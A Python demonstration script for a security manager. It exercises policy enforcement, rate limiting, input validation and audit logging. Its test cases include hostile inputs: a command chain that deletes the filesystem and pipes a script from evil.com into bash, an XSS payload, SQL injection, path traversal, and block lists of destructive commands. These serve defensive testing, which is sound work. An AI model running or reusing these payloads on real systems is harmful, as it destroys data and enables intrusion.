#!/usr/bin/env python3
"""
Security Validation Demonstration.

This script demonstrates the security validation and management
capabilities of the ARK system, including:
- Security policy enforcement
- Permission validation
- Rate limiting and throttling
- Input validation and sanitization
- Audit logging and monitoring
- Risk assessment and mitigation

Run from project root: python examples/security_validation_demo.py --verbose
"""

import asyncio
import logging
import argparse
import sys
import time
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from core.security_manager import (
    SecurityLevel,
    PermissionType,
    SecurityPolicy,
    SecurityContext,
    ValidationRequest,
    RateLimiter,
    InputValidator,
    AuditLogger,
    ARKSecurityManager,
)


async def demonstrate_security_policy_enforcement():
    """
    Demonstrate security policy creation and enforcement.
    """
    print("🔒 Demonstrating Security Policy Enforcement")
    print("=" * 48)

    # Create security manager
    security_manager = ARKSecurityManager()
    print("✅ Security Manager initialized")

    # Define security policies
    policies = [
        SecurityPolicy(
            name="file_operations",
            description="Controls file system operations",
            permissions=[PermissionType.FILE_READ, PermissionType.FILE_WRITE],
            security_level=SecurityLevel.MEDIUM,
            rate_limit=10,  # 10 operations per minute
            allowed_patterns=[r".*\.txt$", r".*\.json$", r".*\.csv$"],
            blocked_patterns=[r".*\.exe$", r".*\.bat$", r"/etc/.*"],
            metadata={"category": "filesystem", "risk_level": "medium"},
        ),
        SecurityPolicy(
            name="network_operations",
            description="Controls network access and operations",
            permissions=[PermissionType.NETWORK_ACCESS],
            security_level=SecurityLevel.HIGH,
            rate_limit=5,  # 5 requests per minute
            allowed_patterns=[r"https://.*", r"http://localhost.*"],
            blocked_patterns=[r".*malicious.*", r".*suspicious.*"],
            metadata={"category": "network", "risk_level": "high"},
        ),
        SecurityPolicy(
            name="system_operations",
            description="Controls system-level operations",
            permissions=[PermissionType.SYSTEM_ACCESS],
            security_level=SecurityLevel.CRITICAL,
            rate_limit=2,  # 2 operations per minute
            allowed_patterns=[r"ps aux", r"df -h", r"uptime"],
            blocked_patterns=[r"rm -rf.*", r"sudo.*", r"chmod 777.*"],
            metadata={"category": "system", "risk_level": "critical"},
        ),
        SecurityPolicy(
            name="data_operations",
            description="Controls data access and manipulation",
            permissions=[PermissionType.DATA_ACCESS],
            security_level=SecurityLevel.MEDIUM,
            rate_limit=20,  # 20 operations per minute
            allowed_patterns=[r"SELECT.*", r"INSERT.*", r"UPDATE.*"],
            blocked_patterns=[r"DROP.*", r"DELETE.*", r"TRUNCATE.*"],
            metadata={"category": "database", "risk_level": "medium"},
        ),
    ]

    # Load policies
    for policy in policies:
        await security_manager.load_policy(policy)

    print(f"📋 Loaded {len(policies)} security policies")

    # Test policy enforcement
    test_operations = [
        {
            "operation": "read_file",
            "target": "/home/user/document.txt",
            "policy": "file_operations",
            "expected": "allowed",
            "description": "Read allowed file type",
        },
        {
            "operation": "execute_file",
            "target": "/tmp/malware.exe",
            "policy": "file_operations",
            "expected": "blocked",
            "description": "Execute blocked file type",
        },
        {
            "operation": "network_request",
            "target": "https://api.example.com/data",
            "policy": "network_operations",
            "expected": "allowed",
            "description": "HTTPS request to allowed domain",
        },
        {
            "operation": "network_request",
            "target": "http://malicious.site.com",
            "policy": "network_operations",
            "expected": "blocked",
            "description": "Request to blocked domain",
        },
        {
            "operation": "system_command",
            "target": "ps aux",
            "policy": "system_operations",
            "expected": "allowed",
            "description": "Safe system command",
        },
        {
            "operation": "system_command",
            "target": "rm -rf /",
            "policy": "system_operations",
            "expected": "blocked",
            "description": "Dangerous system command",
        },
    ]

    print(f"\n🧪 Testing policy enforcement on {len(test_operations)} operations:")

    for i, test_op in enumerate(test_operations, 1):
        print(f"\n📝 Test {i}: {test_op['description']}")
        print(f"   Operation: {test_op['operation']}")
        print(f"   Target: {test_op['target']}")
        print(f"   Policy: {test_op['policy']}")
        print(f"   Expected: {test_op['expected']}")

        # Create security context
        context = SecurityContext(
            user_id="demo_user",
            session_id=f"session_{i}",
            permissions=[
                PermissionType.FILE_READ,
                PermissionType.NETWORK_ACCESS,
                PermissionType.SYSTEM_ACCESS,
            ],
            security_level=SecurityLevel.MEDIUM,
            metadata={"source": "demo", "timestamp": time.time()},
        )

        # Create validation request
        request = ValidationRequest(
            operation=test_op["operation"],
            target=test_op["target"],
            context=context,
            metadata={"test_case": i},
        )

        # Validate operation
        response = await security_manager.validate_operation(request)

        result_status = "allowed" if response.allowed else "blocked"
        status_icon = "✅" if result_status == test_op["expected"] else "❌"

        print(f"   Result: {status_icon} {result_status}")
        print(f"   Risk score: {response.risk_score:.3f}")

        if response.violations:
            print(f"   Violations: {', '.join(response.violations)}")

        if response.recommendations:
            print(f"   Recommendations: {', '.join(response.recommendations[:2])}")


async def demonstrate_rate_limiting():
    """
    Demonstrate rate limiting capabilities.
    """
    print("\n⏱️  Demonstrating Rate Limiting")
    print("=" * 35)

    # Create rate limiter
    rate_limiter = RateLimiter()
    print("✅ Rate Limiter initialized")

    # Define rate limits for different operations
    rate_limits = {
        "api_calls": {"limit": 5, "window": 60},  # 5 calls per minute
        "file_operations": {"limit": 10, "window": 60},  # 10 ops per minute
        "database_queries": {"limit": 20, "window": 60},  # 20 queries per minute
        "system_commands": {"limit": 2, "window": 60},  # 2 commands per minute
    }

    # Set rate limits
    for operation, config in rate_limits.items():
        await rate_limiter.set_limit(
            key=f"user_demo:{operation}",
            limit=config["limit"],
            window_seconds=config["window"],
        )

    print(f"📊 Configured rate limits for {len(rate_limits)} operation types")

    # Test rate limiting
    test_scenarios = [
        {
            "operation": "api_calls",
            "attempts": 7,  # Exceeds limit of 5
            "description": "API call rate limiting",
        },
        {
            "operation": "file_operations",
            "attempts": 12,  # Exceeds limit of 10
            "description": "File operation rate limiting",
        },
        {
            "operation": "system_commands",
            "attempts": 4,  # Exceeds limit of 2
            "description": "System command rate limiting",
        },
    ]

    print(f"\n🧪 Testing rate limiting scenarios:")

    for scenario in test_scenarios:
        print(f"\n📝 Scenario: {scenario['description']}")
        print(f"   Operation: {scenario['operation']}")
        print(f"   Limit: {rate_limits[scenario['operation']]['limit']} per minute")
        print(f"   Attempts: {scenario['attempts']}")

        allowed_count = 0
        blocked_count = 0

        for attempt in range(1, scenario["attempts"] + 1):
            # Check rate limit
            is_allowed = await rate_limiter.check_limit(
                f"user_demo:{scenario['operation']}"
            )

            if is_allowed:
                allowed_count += 1
                status = "✅ Allowed"
            else:
                blocked_count += 1
                status = "❌ Blocked (rate limit exceeded)"

            print(f"     Attempt {attempt}: {status}")

            # Small delay between attempts
            await asyncio.sleep(0.1)

        print(f"   Summary: {allowed_count} allowed, {blocked_count} blocked")

        # Show remaining quota
        remaining = await rate_limiter.get_remaining(
            f"user_demo:{scenario['operation']}"
        )
        print(f"   Remaining quota: {remaining}")


async def demonstrate_input_validation():
    """
    Demonstrate input validation and sanitization.
    """
    print("\n🛡️  Demonstrating Input Validation")
    print("=" * 38)

    # Create input validator
    validator = InputValidator()
    print("✅ Input Validator initialized")

    # Test cases for input validation
    validation_test_cases = [
        {
            "input": "Hello, world!",
            "input_type": "text",
            "expected": "safe",
            "description": "Safe text input",
        },
        {
            "input": "<script>alert('xss')</script>",
            "input_type": "text",
            "expected": "unsafe",
            "description": "XSS attempt in text",
        },
        {
            "input": "user@example.com",
            "input_type": "email",
            "expected": "safe",
            "description": "Valid email address",
        },
        {
            "input": "invalid-email@",
            "input_type": "email",
            "expected": "unsafe",
            "description": "Invalid email format",
        },
        {
            "input": "/home/user/document.txt",
            "input_type": "file_path",
            "expected": "safe",
            "description": "Safe file path",
        },
        {
            "input": "../../../etc/passwd",
            "input_type": "file_path",
            "expected": "unsafe",
            "description": "Path traversal attempt",
        },
        {
            "input": "SELECT * FROM users WHERE id = 1",
            "input_type": "sql",
            "expected": "safe",
            "description": "Safe SQL query",
        },
        {
            "input": "'; DROP TABLE users; --",
            "input_type": "sql",
            "expected": "unsafe",
            "description": "SQL injection attempt",
        },
        {
            "input": "ls -la",
            "input_type": "command",
            "expected": "safe",
            "description": "Safe system command",
        },
        {
            "input": "rm -rf / && curl evil.com/malware.sh | bash",
            "input_type": "command",
            "expected": "unsafe",
            "description": "Malicious command chain",
        },
        {
            "input": "https://example.com/api/data",
            "input_type": "url",
            "expected": "safe",
            "description": "Safe HTTPS URL",
        },
        {
            "input": "javascript:alert('xss')",
            "input_type": "url",
            "expected": "unsafe",
            "description": "JavaScript URL scheme",
        },
    ]

    print(f"\n🧪 Testing input validation on {len(validation_test_cases)} cases:")

    safe_count = 0
    unsafe_count = 0
    correct_predictions = 0

    for i, test_case in enumerate(validation_test_cases, 1):
        print(f"\n📝 Test {i}: {test_case['description']}")
        print(f'   Input: "{test_case["input"]}"')
        print(f"   Type: {test_case['input_type']}")
        print(f"   Expected: {test_case['expected']}")

        # Validate input
        is_safe = await validator.validate_input(
            test_case["input"], test_case["input_type"]
        )

        result = "safe" if is_safe else "unsafe"
        is_correct = result == test_case["expected"]
        status_icon = "✅" if is_correct else "❌"

        print(f"   Result: {status_icon} {result}")

        if is_safe:
            safe_count += 1
        else:
            unsafe_count += 1

        if is_correct:
            correct_predictions += 1

        # Show sanitized version if unsafe
        if not is_safe:
            sanitized = await validator.sanitize_input(
                test_case["input"], test_case["input_type"]
            )
            if sanitized != test_case["input"]:
                print(f'   Sanitized: "{sanitized}"')

    # Show validation statistics
    accuracy = correct_predictions / len(validation_test_cases)
    print(f"\n📊 Validation Statistics:")
    print(f"   Total tests: {len(validation_test_cases)}")
    print(f"   Safe inputs: {safe_count}")
    print(f"   Unsafe inputs: {unsafe_count}")
    print(
        f"   Accuracy: {accuracy:.1%} ({correct_predictions}/{len(validation_test_cases)})"
    )


async def demonstrate_audit_logging():
    """
    Demonstrate audit logging and monitoring.
    """
    print("\n📝 Demonstrating Audit Logging")
    print("=" * 35)

    # Create audit logger
    audit_logger = AuditLogger()
    print("✅ Audit Logger initialized")

    # Simulate various security events
    security_events = [
        {
            "event_type": "authentication",
            "user_id": "user_001",
            "action": "login_success",
            "details": {"ip_address": "192.168.1.100", "user_agent": "Mozilla/5.0"},
            "risk_level": "low",
        },
        {
            "event_type": "authentication",
            "user_id": "user_002",
            "action": "login_failed",
            "details": {
                "ip_address": "10.0.0.50",
                "attempts": 3,
                "reason": "invalid_password",
            },
            "risk_level": "medium",
        },
        {
            "event_type": "authorization",
            "user_id": "user_001",
            "action": "permission_granted",
            "details": {
                "resource": "/api/users",
                "permission": "read",
                "method": "GET",
            },
            "risk_level": "low",
        },
        {
            "event_type": "authorization",
            "user_id": "user_003",
            "action": "permission_denied",
            "details": {
                "resource": "/admin/config",
                "permission": "write",
                "reason": "insufficient_privileges",
            },
            "risk_level": "medium",
        },
        {
            "event_type": "data_access",
            "user_id": "user_001",
            "action": "file_read",
            "details": {"file_path": "/home/user/document.txt", "size_bytes": 1024},
            "risk_level": "low",
        },
        {
            "event_type": "data_access",
            "user_id": "user_004",
            "action": "file_access_blocked",
            "details": {"file_path": "/etc/passwd", "reason": "unauthorized_access"},
            "risk_level": "high",
        },
        {
            "event_type": "system_operation",
            "user_id": "user_001",
            "action": "command_executed",
            "details": {"command": "ls -la", "exit_code": 0, "duration_ms": 150},
            "risk_level": "low",
        },
        {
            "event_type": "system_operation",
            "user_id": "user_005",
            "action": "command_blocked",
            "details": {"command": "rm -rf /", "reason": "dangerous_operation"},
            "risk_level": "critical",
        },
        {
            "event_type": "network_activity",
            "user_id": "user_001",
            "action": "api_request",
            "details": {
                "url": "https://api.example.com/data",
                "method": "GET",
                "status_code": 200,
            },
            "risk_level": "low",
        },
        {
            "event_type": "network_activity",
            "user_id": "user_006",
            "action": "suspicious_request",
            "details": {
                "url": "http://malicious.site.com",
                "blocked": True,
                "reason": "blacklisted_domain",
            },
            "risk_level": "high",
        },
    ]

    print(f"📊 Logging {len(security_events)} security events:")

    # Log all events
    for i, event in enumerate(security_events, 1):
        print(f"\n📝 Event {i}: {event['event_type']} - {event['action']}")
        print(f"   User: {event['user_id']}")
        print(f"   Risk Level: {event['risk_level']}")

        # Log the event
        await audit_logger.log_security_event(
            event_type=event["event_type"],
            user_id=event["user_id"],
            action=event["action"],
            details=event["details"],
            risk_level=event["risk_level"],
        )

        print(f"   Status: ✅ Logged")

    # Generate audit report
    print(f"\n📈 Generating Audit Report:")

    # Count events by type
    event_counts = {}
    risk_counts = {"low": 0, "medium": 0, "high": 0, "critical": 0}

    for event in security_events:
        event_type = event["event_type"]
        risk_level = event["risk_level"]

        event_counts[event_type] = event_counts.get(event_type, 0) + 1
        risk_counts[risk_level] += 1

    print(f"   Events by Type:")
    for event_type, count in event_counts.items():
        print(f"     - {event_type}: {count}")

    print(f"   Events by Risk Level:")
    for risk_level, count in risk_counts.items():
        print(f"     - {risk_level}: {count}")

    # Identify high-risk events
    high_risk_events = [
        e for e in security_events if e["risk_level"] in ["high", "critical"]
    ]
    print(f"   High-Risk Events: {len(high_risk_events)}")

    for event in high_risk_events:
        print(f"     - {event['user_id']}: {event['action']} ({event['risk_level']})")


async def demonstrate_comprehensive_security_workflow():
    """
    Demonstrate a comprehensive security validation workflow.
    """
    print("\n🔐 Demonstrating Comprehensive Security Workflow")
    print("=" * 54)

    # Create security manager
    security_manager = ARKSecurityManager()
    print("✅ Security Manager initialized")

    # Load comprehensive security policy
    comprehensive_policy = SecurityPolicy(
        name="comprehensive_security",
        description="Comprehensive security policy for all operations",
        permissions=[
            PermissionType.FILE_READ,
            PermissionType.FILE_WRITE,
            PermissionType.NETWORK_ACCESS,
            PermissionType.DATA_ACCESS,
        ],
        security_level=SecurityLevel.HIGH,
        rate_limit=15,
        allowed_patterns=[
            r".*\.txt$",
            r".*\.json$",
            r".*\.csv$",
            r"https://.*\.example\.com/.*",
            r"SELECT.*FROM.*WHERE.*",
        ],
        blocked_patterns=[
            r".*\.exe$",
            r".*\.bat$",
            r"/etc/.*",
            r".*malicious.*",
            r".*suspicious.*",
            r"DROP.*",
            r"DELETE.*",
            r"TRUNCATE.*",
        ],
        metadata={"category": "comprehensive", "risk_level": "high"},
    )

    await security_manager.load_policy(comprehensive_policy)
    print("📋 Loaded comprehensive security policy")

    # Simulate complex operations requiring security validation
    complex_operations = [
        {
            "name": "data_export",
            "steps": [
                {"action": "validate_user", "target": "user_credentials"},
                {"action": "check_permissions", "target": "data_export_permission"},
                {
                    "action": "read_database",
                    "target": "SELECT * FROM users WHERE active = 1",
                },
                {"action": "write_file", "target": "/exports/user_data.csv"},
                {"action": "log_activity", "target": "data_export_completed"},
            ],
            "description": "Export user data to CSV file",
        },
        {
            "name": "system_backup",
            "steps": [
                {"action": "validate_admin", "target": "admin_credentials"},
                {"action": "check_disk_space", "target": "/backup/"},
                {"action": "read_files", "target": "/home/user/*.txt"},
                {"action": "compress_data", "target": "backup_archive.tar.gz"},
                {
                    "action": "upload_backup",
                    "target": "https://backup.example.com/upload",
                },
            ],
            "description": "Create and upload system backup",
        },
        {
            "name": "api_integration",
            "steps": [
                {"action": "validate_api_key", "target": "api_credentials"},
                {"action": "rate_limit_check", "target": "api_calls"},
                {"action": "fetch_data", "target": "https://api.example.com/data"},
                {"action": "process_data", "target": "data_transformation"},
                {"action": "store_results", "target": "/cache/api_results.json"},
            ],
            "description": "Integrate with external API",
        },
    ]

    print(f"\n🧪 Testing {len(complex_operations)} complex security workflows:")

    for i, operation in enumerate(complex_operations, 1):
        print(f"\n📝 Operation {i}: {operation['description']}")
        print(f"   Steps: {len(operation['steps'])}")

        # Create security context for this operation
        context = SecurityContext(
            user_id=f"user_{i:03d}",
            session_id=f"session_{int(time.time())}_{i}",
            permissions=[
                PermissionType.FILE_READ,
                PermissionType.FILE_WRITE,
                PermissionType.NETWORK_ACCESS,
                PermissionType.DATA_ACCESS,
            ],
            security_level=SecurityLevel.HIGH,
            metadata={
                "operation": operation["name"],
                "timestamp": time.time(),
                "source": "workflow_demo",
            },
        )

        successful_steps = 0
        failed_steps = 0
        total_risk_score = 0.0

        # Execute each step with security validation
        for step_num, step in enumerate(operation["steps"], 1):
            print(f"     Step {step_num}: {step['action']} -> {step['target']}")

            # Create validation request
            request = ValidationRequest(
                operation=step["action"],
                target=step["target"],
                context=context,
                metadata={"step": step_num, "operation": operation["name"]},
            )

            # Validate step
            response = await security_manager.validate_operation(request)

            if response.allowed:
                successful_steps += 1
                status = "✅ Allowed"
            else:
                failed_steps += 1
                status = "❌ Blocked"

            total_risk_score += response.risk_score

            print(f"       Result: {status} (risk: {response.risk_score:.3f})")

            if response.violations:
                print(f"       Violations: {', '.join(response.violations[:2])}")

        # Operation summary
        avg_risk_score = total_risk_score / len(operation["steps"])
        success_rate = successful_steps / len(operation["steps"])

        print(f"   Summary:")
        print(
            f"     - Success rate: {success_rate:.1%} ({successful_steps}/{len(operation['steps'])})"
        )
        print(f"     - Average risk score: {avg_risk_score:.3f}")
        print(
            f"     - Operation status: {'✅ Completed' if success_rate == 1.0 else '⚠️ Partially completed' if success_rate > 0 else '❌ Failed'}"
        )


async def main():
    """
    Main demonstration function.
    """
    parser = argparse.ArgumentParser(description="Security Validation Demonstration")
    parser.add_argument(
        "--verbose", "-v", action="store_true", help="Enable verbose logging"
    )
    parser.add_argument(
        "--demo",
        choices=["all", "policies", "rate_limiting", "validation", "audit", "workflow"],
        default="all",
        help="Choose which demonstration to run",
    )

    args = parser.parse_args()

    # Configure logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    )

    print("🔒 Security Validation Demonstration Suite")
    print("=" * 50)

    try:
        if args.demo in ["all", "policies"]:
            await demonstrate_security_policy_enforcement()

        if args.demo in ["all", "rate_limiting"]:
            await demonstrate_rate_limiting()

        if args.demo in ["all", "validation"]:
            await demonstrate_input_validation()

        if args.demo in ["all", "audit"]:
            await demonstrate_audit_logging()

        if args.demo in ["all", "workflow"]:
            await demonstrate_comprehensive_security_workflow()

        print("\n🎉 All security validation demonstrations completed successfully!")

    except KeyboardInterrupt:
        print("\n⚠️  Demonstration interrupted by user")
    except Exception as e:
        print(f"\n❌ Error during demonstration: {e}")
        logging.exception("Security validation demonstration error")
        return 1

    return 0


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)
